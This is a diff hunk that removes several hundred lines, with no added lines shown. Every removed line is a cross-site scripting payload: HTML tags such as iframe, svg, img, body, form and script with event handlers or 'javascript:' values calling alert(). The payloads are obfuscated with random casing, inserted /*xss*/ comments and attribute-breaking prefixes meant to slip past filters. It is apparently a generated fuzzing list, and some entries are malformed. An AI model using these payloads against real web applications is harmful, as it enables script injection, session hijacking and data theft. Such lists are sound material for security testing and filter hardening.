@@ -1,400 +1,1000 @@
-<If/*xss*/rAMe ONtOggLe='alert(1)' onloAd='valuE' autofoCuS></IfraMe>
-'>\"<IfraMe OnERror='/**/aLeRT(1)' OnlOad='val/**/ue' autoPlay></ifRame>
-<ViDeO auTOplaY onsUB/*xss*/miT='aLert(2)' onPlay='vALue' data-InfO/*comment*/='TesT/*comment*/'></ViDeo>
-'>\"<Img onLy='javaSCript:alert(3)'/*xss*/ onBlUR='Alert(/**/3)' alt='ALerT(1)' DATa-test='teSt' />
-<body PopOveR='JaVaScrIpt:alE/*xss*/rT(3)' onblur='alert(3)' OnloaD='AlerT(1)' DatA-Info='tes/**/t' />
-'>\"<boDY autoPLAy='JavaSCriPt:aleRT(3)' Onkeyup='AlERt(3)' o/*xss*/NloaD='AleRT(1)' dAta-cusTom='test' />
-<INPUt /**/AutOPlay='JAvAscrIPt:AlERt(3)' oninpuT='aleRt(3)' on/*comment*/chaNge='AlerT/**/(1)' dAta-inFo='teSt' />
-'>\"<body autoFOCus='jAvaScripT:aLErt(3)' oniNPut='aLert(3)' /**/onloaD='AlerT(1)' Data-CUsTOM='tEst'/**/ />
-<svg onErrOr='AlErt(1)' OnMOusEov/**/eR='value' AutoPlay></svG>
-'>\/*comment*/"<sVG ONPASte='ALert(1)' /**/onmouSeover/*comment*/='vAlue' auTOplay></svg>
-<Img PoPO/**/VEr='jaVascripT:alert(3)' OnFoCUs='aleRt(3)' aLT='alert(1)' DAtA-xss='TEst' />
-'>\"<BODy auTofocUs='jAvaScRipt:alErT(3)' on/**/pAStE/*comment*/='alERT(3)'/*xss*/ onerror='AleRt(1)' Data-CUstom='TeST' />
-<svG oNbLur='al/*xss*/ert(1)' OnloaD='vaLue' PoPoVER></sVG>
-'>\"//*comment*/*xss*/<viDeo aUtOplaY OnFocus='alERt(2)' srC='Value' datA-CuSTo/*comment*/M='TEst'></viDeo>
-/**/<audio /*xss*/aUtOfOcuS oNfocUs='alerT(2)' ONPlAy='value' d/*xss*/aTa-iNfo='TEsT'></audIO>
-'>\"<Body poPover='javAscRIPT:aleRT(3)' oniNpUt='aleRT(3)' OnlOA/**/D='Alert(/**/1)' daTa-inFO='tE/*comment*/st' />
-</**/audiO AUTOPLay onToggLe='aleRt(2)' autoPLay='Value' data-tEst='TeSt'></aUDI/*comment*/o>
-'>\"<aUDIO/*xss*/ autoFoCuS oNpasTe='alert(2)' AUtoplay='VALue' dAta-cusTOm='Test'/**/></audIo>
-<aUdio On OnBlur='alerT(2)' AutOpLay='vAlUe' data-xSS='teSt'>/*xss*/</audIO>
-'>\"<sVg onFoc/*xss*/us='ALeR/*comment*/t(1)' sTyle='Value' oN></SvG>
-<bOdy PopoVEr='javaScript:ALeRt/*comment*/(3)' OnpastE='alerT(3)' oNLoAd='ALerT(1)' data-/*comment*/cusToM='test' /*comment*//>
-'>\"/*comment*/<videO AUTofocUs OnERrOr='alErT(2)' src='valuE' data-infO='TESt'><//**/video>
-<Form AutoPlaY='jaVasCRiPT:aleRt(3)' OnkEyUp='alert(3)' A/*xss*/cTion='aLert(1)' DAta-cuStom='tEST' />
-'>\"<audio auTOplaY oNkEYup='ALert(2)'/**/ sRc='Value' Data-Xss=/*xss*/'TEst'/**/></auDIo>
-<sVg onFocUs='AlErt(1)' STyle='valUe' aUTo/**/play></sV/*comment*/G>
-'>\"<iframe OniNpuT='ALert(1)' srC='vaLue' on>/**/</iframe>
-<iNPut AUTofoC/**/Us='/*xss*/javAScRipt:alert(3)' onpaSte='aleRT(3)' Value='AleRt(1)' dAtA-xss='TEsT' />
-'>\"<VideO ONly o/*xss*/NBlur='AlerT(2)' autoplAy='vAlue' Data-xss='TEst'></video>
-<inpuT ON='javAsCrIpT:ALerT(3)' oNLoAd='AlErt(3)' onFocus='alert(1)' /*xss*/DATa-xss='test' //*xss*/>
-'>\"<vidEo ON ONselecT='aLer/**/t(2)' oNPlay='value' D/**/atA-xsS='teSt'></VIdEO>
-<B/*comment*/ody onLy='jAvascRIpt:Alert(3)' onse/**/lect='aLerT(3)' onErROr='AleRT(1)' data-info='TeST' />
-'>\"<IN/**/put auTOplAy/*xss*/='jaVaSCrIpt:alert(3)' oNpASte='aLErt(3)' OnfOcus='alerT(1)' dAta-info='TEsT' />
-<sCripT onLOad=/*commen/**/t*/'AlERt(1)' type='VaLuE' aUtoplaY></scriPt>
-'>\"<audiO On oNl/*comment*/OAd='ALeRt(2)' autOpLAy='valUe' Data-TeST=/**/'tesT'></auDio>
-<inPUt auTofocUs='jaVaScriPT:alert(3)' onSeLEcT='aLeRT(3)' oNChanGe/*xss*/='/*xss*/aLeRt(1)' DaTa-Test=/*xss*/'Test' />
-'>\"<sVg onsubMit='aLERt(1)' onload='VAluE' A/*comment*/utoPLay></svg>
-<Audio oNLy OncLick='aLErt(2)' src='valUE' d/*xss*/atA-CUStOm='teSt'/**/></aud/*xss*/iO>
-'>\"<s/**/vg /*comment*/OnPaSte='alErt(1)' StylE='VAlUE' o/**/n></svg>
-<ViDEo aUtOfOCus onkeyup='aLert(2)/*xss*/' /*xss*/onPlay='vaLUe' Data-iNFo='teSt'></vIdeO>
-'>\"<forM On='jAvasCrIPt:AleRt(3/*comment*/)' onsUBmIT='aleRt(3)' aCtioN='Alert(1)' datA-xss='TEst' />
-<Img AUtopLay='jAvAsCrIpt:Al/**/ert(3)' OneRroR='AleRT(/*xss*/3)' SRc='aLert(1)' daTA-/*xss*/xSs='tesT' />
-'>\"<sCri/*xss*/Pt onlOad='aLErT(1)' Src='valUe' Popover></script>
-<i/*comment*/FRame /*comment*/OnkEyuP='Alert(1)' oNloAd='vALUe' on></IFramE>
-'>\"<iMg PopoVer='javAsCRIpt:AlerT(3)' onInPUt='AleRt(3)' Alt='aLeRt(1)' Data-cuStom='t/*xss*/eST' />
-<iMg aUToFocuS='jAVascriPT:aLerT(3)' onFocus='aLerT(3)' ONE/*xss*/rRoR='alert(1)' daTa-inF/*comment*/o='tesT' />
-'>\"<BodY auTofocUS='JavaScrIpt:/*comment*/alert/*xss*/(3)' oNToggle='alert(3)' /*comment*/onERROR='Alert(1)' dAta-info='tESt' />
-<sVg OnFOC/**/us='alert(1)' onLoad='Value' oNlY></sVg>
-'>\"<INput auToPlAY='javascripT:aleRt(3)' onSelECt='ALeRT(3)' onfocus='ALERt(1)' daTA-Test='tes/**/t' />
-<foRm a/*comment*/utOpLAy='JavasCRipt:aleRT(3)' oNsuBMit='AlErt(3)' On/*xss*/suBmIT='AlErt(1)' dAta-xsS='teSt' />
-'>\"<aUdio ON onKeyup='alert(2)' sRc='vALue' dAtA-xsS='teS/**/t/**/'><//**/AuDiO>
-<IfRame OnlOaD='aleRt(1)' on/*comment*/load='valUe' aUTOP/**/laY></iFRa/*comment*/me>
-'>\"<Audio Po/**/PoVeR OnSubmIT='ALert(2)' onplay='val/*comment*/ue' datA-cusTOM='TeST'></aUdiO>
-<ViDEO AUtopl/*xss*/aY oninput='aleRt(2)' onplaY/*comment*/='valuE' daTa-TeST='tESt'></vIdeO>
-'>\"<sVg onMoUSeover='alert(1)' /*comment*/on/**/mOuSeOver='vAlUE' autofocus></sV/*xss*/g>
-<audiO Only oNclick='AleRt(2)' autOplAy='VaLUE' Data/*comment*/-XSs='teSt'></AUdIo>
-'>\"<BOdy AutOplAy=/**/'JaVaScript:alert(3)' ONClicK='alerT(3/*comment*/)' /**/oNerrOr='AleRt(1)' datA-iNFo='TEst' />
-<sCRipt onTogGle='alerT(/*xss*/1)' Src='vAlue' AUtofocuS></sCriPT>
-'>\"<Iframe OnfocUs='AleRT(1)/*comment*/' onload='valuE' OnlY></I/**/fRamE>
-<iNput AutOPlaY='JavascrIPT:alErT(3)' o/**/nBlur='alerT(3)' OnchAnge='alErt(1)' Data-cUstOm=/*comment/*xss*/*/'tEsT' />
-'>\"<img oN='jAVAScript:alErT(3)/**/' OnfocuS='/*comment*/aLeRt(3)' onerrOr='AleRt(1)' DaTA-cUst/**/om='tesT' />
-<sCrIpT o/*comment*/NChaNge='alerT(1)' typE='vAluE' pOpOveR></script>
-'>\"<fOrm aUtofoCus='JavaScri/*xss*/Pt:alert(3)' onload='AleRt(3)' onSubMIT='alerT(1)' daTa-tEst='TEST' />
-<vIdEo AUtofO/*xss*/Cus onfocUs='alert(2)' Src='vaLUe' daTa-cuStom='tEST'></viDEO>
-'>\"<viDeO poPov/*xss*/Er/*xss*/ O/**/nInpuT='aleRT(2)' autopLAy='ValuE' daTa-custOM='tesT'></vIdEO>
-<scripT ONCLiCk='alert(1)' type='V/*xss*/aluE' On></ScrIP/*comment*/T>
-'>\"<video AU/*xss*/tofocUS oNkeYdOwn='aleRT(2)' OnpLay='Value' d/**/atA-tEst='test'></viDe/**/o>
-<ScRIpt oNSUbMiT='aL/*xss*/erT(1/*comment*/)' type='Value' popoveR>/*comment*/</script>
-'>\"<vIdeO oN/*xss*/Ly onchanGe='aleRt(2)' autOpLaY='vAlUe' daTa-XSs='teSt'></ViDeO>
-<a/*xss*/udio oN oNblUr='aLErt/**/(2)' onPlAY='valUE' daTa-CusTom='tESt'></AudIO>
-'>\"<foRm popOveR='JaVaScriPt:AlErT(3)' OnfOcUS='alert(3)' aCtIon='ale/**/rt(1)' datA-C/**/uSTOM='teSt' //*comment*/>
-<Vi/*comment*/deO on oniNPut='alErt(2)' src='valUe' data-Test='test'></VIDeO>
-'>\/*xss*/"<ifrAME onInput='ALErT(1)' sRc='/*comment*/valUE' On></ifrAm/*xss*/E>
-<ImG aUtOpLay='JaVascrIpt:/**/aleRt(3)' onchange='alErT(3)' aLt='aLErt(1)' Data-inFo='tEsT' //**/>
-'>\/*xss*/"<aUdio popOVeR onLOad='ALert/*xss*/(2)' oNplaY='vAL/**/Ue' daTA-cuStom='test'></aUdio>
-<sVG oNMoUseoVer/*comment*/**//='A/*comment*/Lert(1)' StYle='value' oN></SVg>
-'>/**/\"<scrIpt onChAnGe='alerT(1)' typE='vALue' pOPoveR></SCriPt>
-<svG oNfOcus='Alert(1)' OnmOU/*c/*comment*/omment*/SeoVEr='value' PopOveR></svg>
-/*comment*/'>\"<fOrm AutOfocus='javAscript:ALeR/**/T(3)' onTOggLe='ALert(3)' oNsubmIt='aLeRt(1)' DaTa-xsS='tEsT' />
-<vIdEo autoplAY oNTOggle='Alert(2)' aUtOPlaY='VAlu/*comment*/e' dAta-test='/*comment*/teST'></VidEO>
-'>\"</*comment*/AudiO On onsUbmiT='aLerT(2)' srC='valuE'/*comment*/ DaTa-custoM='tESt'></AuDiO>
-<ViDeO aUtOf/**/ocuS OnKEydOwn='aleRt(2)' src='VAlue' daTA-tEst='TEsT'></VideO>
-'>\/*xss*/"<audio autOpL/**/ay O/*xss*/nSelEcT='alert(2)' src='vAlUe' DATA-Custom='Test'></Audio>
-<FOrm popover='jaVASCRIpt:AleRT(3)' onkeyUp='AleRt(3)' A/*commen/*xss*/t*/CTioN='alert(1)' DatA-test='teSt' />
-'>\"<Input onlY='jAVasCRIPT:aLert(3)' O/*xss*/nbluR='al/**/*comment*//ert(3)' vaLUe='alert(1)' dATa-infO='test' />
-<Svg OnChaNge='aLeRt(1)' onMOuseOveR='vALUe' popo/**/ver></sVg>
-'/*comment*//*xss*/>/*xss*/\"<FoRM AuToPlay='javaScrIPT:alerT(3)' oNchaNgE='alert(3)' OnsUBMit='alert(1)' DATa-inFo='Test' />
-<iMG AutoFoCUs='jAvascrIp/*comment*/t:AlEr/**/T(3)' onfoCUS='alert(3)' onerroR='aLeRT(1)' dATA-teSt='Test' />
-'>\"<svg O/*xss*/nkeYdown='aleRT(1)' oNLoad='/**/vAlUE/*xss*/' autOFOcuS></Svg>
-<scRiPt oNkeYdOwn='AleRt(1)' src=/*xss*/'valuE' popovER></ScRipT>
-'>\"<audIO popoVEr oNeRROR=/*comment*/'aLeRt(2)/*commen/*xss*/t*/' src='vAlue' DAta-info='TeST'></auDIo>
-</**/ifRame oNe/*xss*/RRor='AlerT(1)' oNlOAD='VaLue' auToFoCUs></iframe>
-'>\"<vidEO PopoVeR oNkEyUp/*xss*/='AlerT(2)' src='valUe' DaTa-xss='tEst'></vIDeo>
-<Svg oNinpUT='AlErt(1)' /*comment*/ONloaD='valUE' AutOfocUs>/**/</Svg>
-'>\"<InPut popover='javAscript:ALE/*comment*/Rt(3)' oNlOAd=/*xss*/'aleRt(3)' oNfocUs='aLert(1)' DatA-tEst='/**/tEst' />
-<svg Onload='alErt(1)' OnLoad='Va/**/LUE/**/' on></svG>
-'>\"<iFRAme OnpAStE='a/**/lert(1)' oNLoad=/**/'value' P/*xss*/OPOver></ifRaME>
-<sVg oNkeYuP=/*comment*/'AleRT(1)' onLOaD='Value' on></svg>
-'>\"<IMg oN='jAvaScrIp/*xss*/t:alerT(3)' onerror/*xss*/='aLErT(3)' aLt='alerT(1)' datA-Test='test' /*comment*//>
-<ifRAmE onsElect='aLerT(1)' Onload='vAlUe' aUto/**/fOcuS></IFrAme>
-'>\"<iframe ONBl/**/Ur='/*xss*//*comment*/aLeRT(1)' SRc='vaLue' autopLaY></iframe>
-<SVg OnsubMit='alerT/*xss*/(1)' oNloaD='vAlue' AutoFocUs></svG>
-'>\"<Img AutOfoC/**/uS='JavAScRiPt:Alert(3)' ON/*comment*/ke/*comment*/ydown='alert(3)' alT='AlerT(1)' daTa-xSs='test' />
-<SCRIpT/**/ onchaNGE='alert(1)' /*comment*//*comment*/TypE='VAlue' popover></scripT>
-'>\"<video on ONpaste='aLErt(2)' auToPlay='ValUe' DAtA-/*xss*/teSt='t/*xss*/ESt'></vIdeo>
-<FORm autoFoCUS='jAvasCripT:alerT(/*xss*/3)' ONpaStE='AleRT(3)' OnsuBMIt='alert(1)' data-xss='test' />
-'>\"<iMG onlY='jAvAscripT:ALE/**/rT(3)' onin/*comment*/pUT='aLeRt(3)' src='aLert(1)' DAta-teSt='tEst' />
-<inPut auToPlay='javAScRipT:AlerT(3)'/*comment*/ oNtOGgle='alErt(3)' /*xss*/onchanGe='AleRT(1)' dAta-test='TEst' />
-'>\"<ifr/**/amE ONfocUS/*comment*/='alErt(1)' onloaD/*xss*/='value' AutOplay></IFraMe>
-<aUdIO onlY onbLuR='ALerT(2)' OnPlay='vAlue' dAta-info='/**/TesT/*xss*/'></audIo>
-'>\"<sCRipt onPaste='aLErt(1)' /*xss*//*comment*/tyPe='VALUe' popOVer></scrip/*xss*/t>
-</*xss*/Script onKeYUp='aLerT(1)' SRc='vaLUe'/*comment*/ OnLy/*comment*/></sCript>
-'>\"<ScrIPt onKeyup='alERt(1)' type='valuE' auTOFoCUS></ScripT/**/>
-<aUdIo poPOV/**/er ONchangE='aLErt(2)' AutoPlAY='vALue' data-test='tesT'>/*xss*/</AUdio>
-'>\"<scRipT oN/*xss*/paste/*comment*/='AlERT(1)' SRc='vaLUe' onlY></Scrip/**/t>
-<vi/**/Deo on ONfocUS='alerT(2)' autopLay='vAlUe' Data-CUsTom='TeSt'></Video>
-'>\"<forM On='javAScriPt:alErT(3)' oNsEleCT='aleRt(3)' OnsUb/*xss*/mit='alert(1)' dAta-CuSt/*xss*/om='/*xss*/tESt' />
-<FOrm /*comment*/auTofocUS='JAvasCripT:aLErt(3)' onsubmit='AleRt(3)' oNsubMiT='ALeRt(1)' data-inFO/*comment*/='TE/**/sT' />
-'>\"<ifRAmE onsubmIt='alert(1)' Onload='ValUe' onlY><//**/IfraME>
-<inpUt PopOv/**/eR='JaVaScrIpt:aleRt(3)' onkeyDown='alerT(3)' onfOcuS='al/**/ErT(1)' DaT/**/a-cusTOm='teSt' />
-'>\"<svg o/**/nfoCus='aLerT(1)' stYlE='valuE' pOpover></sVg>
-<SCr/**/Ipt On/*comment*/focUs='aLeRT(1)' typE='value' onLY/**/></SCript>
-'/*xss*/>\"<body oN='jaVascRipt:Alert(3)' ONfocUS='alert(3)' oNErR/*xss*/Or='aLErt(1)' da/**/TA-tEsT='test' />
-<ifr/**/aMe oN/**/inpUT='alerT(1)' Src='vALue' on/*xss*/ly></IFRame>
-'>\"</*xss*/Body ON='jAVAscript:alerT(3)' onbluR='aLERt(3)' ONeRror='alert(1)' datA-xSs='test' />
-<fOrm AUtOfoCus='jaVa/*xss*/sCripT:ALErt(3)' onmouseovER='aleRT(3)' /*xss*/ONsubmIt='aLErt(1)' DA/**/ta-cUSTom='tEst' />
-'>\"<bodY aUToP/*xss*/LAy='JA/*comment*/vaSCRIpt:aLERT(3)' onchanGe='/*comment*/alert(3)' oNload='alert(1)' daTa-XsS='teST' />
-<form/*comment*/ only='jaVASCripT:alERt(3)' OniNPut='alErt(3)' onsubmit='ALERt(1)' Data-XSs='TeSt/**/' />
-'>\"<inpUT pO/*comment*/poVER='jaVaScripT:alert(3)' onMoUSeover='aLe/*xss*/rt(3)' oNfOCus='alErT(1)' data-tesT='tEst' />
-<video AutofocuS//*xss*/*xss*/ onSelECt='alErT(2)' auTOplaY='Valu/*comment*/e' daTa-info='tEST'></vIdEo>
-'>\"<IFrame/*xss*/ o/*xss*/npaste='AlerT(1)' onload='VAlu/**/e' oN></ifrAme>
-<ifRame oNmoUsEOVEr='alerT(1)' Onload='Va/*comment*/LuE' only></IfRA/*comment*/me>
-'>\"<VIdEO onlY onfocUs='aLert(2)' onpLAY='Value' daTa-Xss='teSt'><//**/viDeo>
-<ViDEo /*comment*/OnL/**/y oninput='AlErt(2)' AUToPlay='vaLuE' DatA-iNFo='test'>/*xss*/</ViDeo>
-/*xss*/'>\"<form AUtOplay=/**/'javaSCrIpt:Aler/**/T(3)' oNcHange='alerT(3)' ActIon='aleRt(1)' Data-info='TEst' />
-<form autOplay='java/**/Script:alErt(3)' Onfocus='aLeRt(3)' aCTIoN='aLeRt(1)' DATa-c/*xss*/usTOm='tesT' />
-'>\"<FORm AutofoCUS='javAscripT:AleRT(3)' ontoGg/**/le='ALert(3)' onsuBmit='Alert(1)' datA-TESt='test/*xss*//*xss*/' />
-<InpuT autoPLay='JavAsCriPt:al/*comment*/ert(3)' onSeLEct='alErT(3)' on/*comment*/cHANgE='Alert(1)' DAta-xsS='tesT' />
-'>\"<vidEO onLy oNp/**/a/*xss*/STe='aLeRt(2)' autOPlaY='valUE' daTA-InfO='Test'></vIDeo>
-<iFrAme on/**/SuBMit='alert(1)' srC='vaLUe' POpoVER></Ifram/*xss*/E>
-'>\"<v/*comment*/IdeO oNly oNClIcK='alErt(2)'/*comment*/ Autoplay='VaLuE' data-info='teS/*comment*/T'></video>
-<iMg AUTofoCus='jAvAscRIpT:ALert(3)' onKEyup='alert(3)' a/*xss*/lt='/*xss*/Alert(1)' data-Info='tEST' />
-'>\"<inpUT AUtOplAy='jaVaSCRiPt:alert(3/**/)' oninPUT='aLeRt(3)' oNfocus='alert(1)' DAta-TeSt='tesT' />
-<BodY popOVEr='javasCRipt:aLert(3)' on/**/pastE='AlErt(3)' OnErROR='aLERT(1)' DaTa-xss='teSt' />
-'>\"<SvG onBluR='ALeRt(1)' oNloaD/*comment*/='vAlue' aut/*xss*/oFocU/**/s></svg>
-<Body on='JavAScRiPT:alert(3)' o/*comment*/NtoGGle='ALeRt(3)' onerRoR='alErt(1)' dAta-Xss='tesT' />
-'>\"<VIDeO on OnBlUr='aleRT(2)' sRc='/*xss*/vAlue' DAta-xss='TEsT'></Video>
-<B/**/Ody on='jAvascript:alert(3)' OnSubmIt='AlErT/*comment*/(3)' onERroR='/*xss*/aLeRt(1)' daTa-tesT='TESt' />
-'>\"<Svg OnerRor='aleRt(1)' StYle='ValuE' onLy/**/></sVg>
-<Body AutoPlAy='/**/JaVascrIP/*comment*/t:alerT(3)' ONtOGgLe='al/*comment*/ert(3)' onerRoR='AlERT(1)' DATA-teSt='Test' />
-'>\"<Input PopoVer/*comment*/='jaVascRiP/*comment*/t:ALerT(3)' oNKEyUp='aLert(3)' onChange='alErt(1)' daTa-CusTom='TesT' />
-<INPUT ONly='jAvASCriPT:Alert(3)' onLOad='alert(3)' oNchange/*comment*/='alErt(1)' D/**/aTa-INfO='test' />
-'>\"<bOdy AutoPlaY='jAVascRiPt:alErt(3)' onsubmiT='aleRT(3)' OnlOaD='AlERt(1)'/**/ data-info=/*xss*/'teSt' />
-<BOdy auTofocus='JavAScrIpt:aleRT(3)' Oninput='AlErT(3)' onerROR='ALErt(1)' data-/**/Info='tesT' />
-'>\"/*xss*//*xss*/<inpuT Only='JaVAscriPt:alERt(3)' oNFocUS='Alert(3)' On/**/chaNge='alert(1)' daTA-TesT='test' />
-<iFrame OnseleCt='a/**/lErt(1)' onloAD='vALUE'/*xss*/ onLY></ifraME>
-'>\"<iMg p/**/opOvER='javaSc/*comment*/RipT:AlerT(3)' onselEct='alert(3)' oNerroR='aLErt(1)' dATa-iNfO='T/*xss*/est' />
-<bOdy autoFoCuS='javasCript:alErT(3)' onkeyDOwn='alerT(3)' oNlOaD='alerT(1)' Data-inFO='te/*xss*/st' />
-'/*xss*/>\"<vIdEo ON OnpAste='aLERT/*xss*/(2)' autOplay='valUe' DaTA-custOM='tesT'></viDeo>
-/*xss*/<iFrAMe OnfoCus='aLErt(1)' srC='VAluE' onLy></IframE>
-'>\"<BODY only='jAvAscRipt:ALert(3)' O/**/Nselect='al/*comment*/ert(3)' oNerrOr='AlErt(1)' da/*comment*/Ta-teST='TeSt' />
-<vidEo oNly oNclick='aleRt(2)' aUToplAy='Value' DaTa/*comment*/-test='TesT/*com/**/ment*/'></VideO>
-'>\"<scRipt onkeyuP/*xss*/='alErt(1)' src='/*xss*/VaLUe' autofOCuS></sCriPt>
-<Audi/*xss*/O oN onchaNge='alert(2)' oNplAy='vALUe' DATa-xSS='teSt'></audio>
-'>\"<inpuT onlY='jAvASCRiPt:aLert(3)' onsUbmit='aLErT(3)' oNf/**/ocuS='Ale/*xss/*xss*/*/rT(1)' data-tEst='Test' />
-<audiO auTOFOCus oNerRor='AlErt(2)'/*comment*/ OnplaY='vALue' daTA-cusTom='tesT'></aUDiO>
-'>\"<FoRm popOver='jaVaScrIpt:alERt(3)' Onmouseover='AleRt(3/**/)' onsUBMiT='alErt(1)' DaTa-test='TESt' />
-<SCRIpt oNkEydoWn='aLerT(1)' SrC='Value' on><//*xss*//*xss*/ScRiPt>
-'>\/*comment*/"<sVG OnkeyuP='alErT(1)' oNmoUseover='vAluE' oNLy></SVg>
-<iFrAme OnBlur='alert(1)' SRC='Value' On></if/**/rame>
-'>\"</*xss*/img on='jaVascRipt:alERT(3)' onselect='alErT(3)' alT='Aler/*comment*/t(1)' daTa-xS/**/s='TEST' />
-</**/IMG popoVeR='JAVascrIPt:aLErT(3)' onsEleCT=/**/'aLErT(3)/**/' src='aLert(1)' data-xSs='test' />
-'>\"<IFRaMe oNiNPUt='aLeRt(1)' onl/**/oad='vAlue' popOvER></IFramE>
-</*comment*/scripT ONMOUseoVER='aleRt(1)' type='Value' pOPover/**//*xss*/></script>
-'>\"<iFRa/*xss*/mE onsubMIT='AlerT(1)' onLoad='vAlue' oNly></IFrame>
-<vide/**/o oNly oNKeYDOwn='Aler/*xss*/T(2)' sRc='vAlue' datA-TESt='test'></videO>
-'>\//*xss*/*xss*/"<ScRiPT oNbLur='a/*xss*/lerT(1)' src='value' popOvEr></script>
-/*xss*/<vIDeo On oNToggle=/*comment*/'aLerT(2)' srC='vAlUe' data-cuSTO/*comment*/m='tEst'></VIdEo>
-'>\"<VidEo auToPlAy ONerRO/*comment*/R='AlerT(2)' Onpl/*xss*/Ay='valuE' Data-teSt/*comment*/='Test'></videO>
-<iNPut popOVeR='javAscrIPt:alERt(3)' oN/*comment*/cLicK='aLErt(3)' onfOcus='ALeRt(1)' dATa-custom='test' />
-/**/'>\"<input on='javascRiPt:aLErt(3)' OnCHange='alErT(3)' vaLue='ALert(1)' dAta-info='teSt' />
-<aUdio on /**//*comment*/onCliCk='ALert(2)' sRc='valuE' data-iNFo='tEst'></AudiO>
-'>\"<input ONly='javAsCrIpT:aLert(3)' ONcHaNgE='ALert(3)' onchaNGe='alErt(1)' datA-cust/**/oM='TeSt' />
-</**/auDIO autopLaY onkey/*xss*/Up='AleRT(2)' srC='VaLue' daTA/*xss*/-xSs='teSt'></auDIo>
-'>\"<foRm PopoveR='JavasCRipt:aLErt(3)' onbLur='AlErt(3)/*xss*/'/**/ onSubmit='ALErt(1)' dATA-xss='Test'/*comment*/ />
-<sCript oNSelecT='alErt(1)/*x/*c/**/omment*/ss*/' tYpe='VALue' On></Script>
-'>\"<foRM popOver='JavascrIpt:ALErT(3/*comment*/)' OnseLect='a/*comment*/leRt(3)' oNSuBmit='alErt(1)' daTa-tEsT='test' />
-<Body autofocuS='j/*xss*/avAsCRIpt:Alert(3)' oNchANG/*xss*/E='aleRT(3)' onlo/**/Ad='AlErt(1)' data-cUsToM='test' />
-'>\"<form pOpoveR='jAvAsCRipt:alert(3)' onC/*xss*/HAngE='alErt(3)' onSuBMit='AlErt(1)' daTA-test='/*xss*/TEsT' />
-<inpuT poPOver='jAVASCript:Alert(3)' OnmOuseoveR='aLert(3)' onfocus='alErt(1)' dATA-Te/**/st='test' />
-'>\"<Script oner/*comment*/RoR='ALeRT(1)' type='Value' /*xss*/aUtOplaY></Script>
-<sVg oneRROr='alert(1)' styLE='valUE'/*xss*/ AutoplAy></sVG>
-'>\"/*comment*/<fOrM popover='jAVasCriPT:aLerT(3)' onkeyup='alERT(3)' onsubMIT='AlErt(1)' data-XSs='tEst' />
-<IFRamE oNiNpuT='aleRt(1)' onLoad='vaLue' ONLy></Ifra/*comment*/me>
-'>\"<vIDeo ONlY oNBlUr='aleRT(2)' SRc='VAlue' data-inFo='Test'></vi/*comment*/DEo>
-<FoRM auToFoCUS='JavascrIpT:aleRT(3)' oneRroR='a/*xss*/lErt(3)' aCtiON='alert(1)' DAta-inFo='TesT' />
-'>\"<sVG onKeyup='aLeRT(1)' OnLoAd='Value' aut/*xss*/oplay>/**/</S/**/vg>
-<BodY on='javaSCript:AL/*xss*/ErT(3)' oNkeyd/*xss*/oWn='alert(3/**/)' Onerror='AlERt(1)' Data-xss='teSt' />
-'>\"<img onLy='jAvaScRIPt:alert(3)' oNmousEoVer='alERT(3)' sRc='aleRt(1)' data-cusTOm='teST' //**/>
-<vidEo aUTOpl/*comment*/ay onchangE='ALErt(2)' auToPlaY='VaLuE' data-infO=/*/*comment*/xss*/'tEst'></videO>
-'>\"<svg /**/onload/*comment*/='ALerT(1)' stYlE='value' ON></svG>
-<VideO aUtOplaY ontogGl/*xss*/e='aLert(2)' src='vAluE' DAtA-iNFo='test'></**//vIdEo>
-'>\"<ifRA/**/Me onsubmit='alErt(1)' OnloAD='VAlue' auTOplay></iFRaME>
-<iMG POPOver='jaV/*xss*/aScriPT:alErt(3)' onBLur='alert(3)' o/*xss*/nerroR='alert(1)' datA-infO='TeST' />
-'/*comment*/>\"<iFrAME onBLuR='aleRT(1)' oNlOad='VAlue' on></iFrAme>
-<Svg onMouSeoveR='Alert(1)' O/*xss*/nload='va/**/lUe' auToFocus></sVG>
-'>\"<s/*comment*/Vg onkEydOWn='ALerT(1)' onLoAd='VAluE' onLy></sVg>
-<IMg oNly='jAVascrIpt:aLERt(3)' ontOggle='alE/*xss*/Rt(3)/*comment*/' aLt='alert(1)' DATa-custOm='teST' />
-'>\"<forM AuTofOcus='jAVascrIpt:alerT(/*xss*/3)' onPaStE='aLERt(3)' ONsUbMit='ALerT(1)' datA-CusTom='test' />
-<iframe ONCLIck='ALerT(1)' sRC='va/**/lUe' autopLAY></i/**/frame>
-'>\"<body autofOcus='JavAscRIpt:AlErT(3)' onInput='alert(3)' onLoAd/*xss*/='ALErt(1)' daTa-CusTOm='test' />
-<svG onMOuseoveR=/*xss*/'aL/*xss*/erT(1)' ONlOAd='VALUe' only></sVG>
-'>\"<img auTOPlay='JAVaScript:alE/**/Rt(3)' OnLoad='AlErt(3)' onERroR='aLERt(1)' Data-cusToM='Test/**/' />
-<sCRipt oNinpUt='a/**/LErt(1)' sRC='ValUe' only></sCRipt>
-'>\/*com/*xss*/ment*/"<ifraMe oNlOAd/*xss*/='aLErt(1)' Src='valuE' ONly></IfrAme>
-<ifRAME onloaD='Ale/**/Rt(/*xss*/1)' Onload=/*comment*/'valUE' AUToplay></ifRaMe>
-'>\"<IfRamE oNcLiCK='ALerT(1)' srC='value' oN></ifra/**/Me>
-<inpUt AutoplaY='JavascRipt:Alert(3)' onmoUseoVEr='AleRt(3)' Onc/*comment*/haNgE='ALert(1)' daT/**/A-iNfo='tEst' />
-'/*comment*/>\"<AudiO AUtoPLay Onch/*comment*/ange='Alert(2)' onplay='vALUE' Data-cusTom='Test'></auDio>
-<InPut AuTOFoCUs='jAvAScrIpt:alert(3)' ONKeydoWN='aLeRt(3)' onchange='alert(1/*xss*/)' D/**/AtA-tesT='test' />
-'>\"<foRm oN='JaVAsCriPt:Alert(3)' onpaSTe='AlerT(3)' OnsUbmit=/**/'/*comment*/AleRt(1)' DAta-Xss='T/*comment*/EsT' />
-<Input ON='jAVAsCripT:alerT(3)' oneRroR=/*comment/**/*/'aLeRt(3)' valU/*xss*/e='alert(1)' data-InfO='test' />
-'/**/>\"<SVg onerror='AlERt(1)' onMouSe/*xss*/OVer='vAlUE' onlY></Svg>
-<Form AUtoFOcuS='jAvAsCRIpt:aleRt(3)' o/*xss*/nClick='ALert(3)' actIOn=/*comment*/'alERt(1)' data-xsS='teSt' />
-'>\"<scRIpt OnKeydoWn='alert(1)' tYPe='vAlue' auToPlAY></scrip/*comment*/T>
-<ViDeO AUtofocus OnToggle='AleRt(2)' autopLAy='vALue' Data-Xss=/*comment*/'test'></vIdeo>
-'>\"<SVg oNkeyup='alert(1)' styLE=/*xss*/'vaLUE' popover></SvG>
